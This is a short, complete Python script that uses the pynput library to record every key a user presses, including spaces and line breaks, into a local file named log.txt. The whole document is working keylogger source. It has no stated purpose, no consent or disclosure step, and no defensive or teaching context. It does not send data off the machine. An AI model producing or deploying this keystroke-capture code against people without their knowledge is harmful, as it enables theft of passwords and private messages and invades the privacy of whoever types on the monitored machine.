from pynput.keyboard import Listener, Key

log_file = "log.txt"

def on_press(key):
    with open(log_file, "a") as file:
        if key == Key.space:
            file.write(" ")
        elif key == Key.enter:
            file.write("\n")
        elif hasattr(key, "char") and key.char is not None:
            file.write(key.char)

with Listener(on_press=on_press) as listener:
    listener.join()

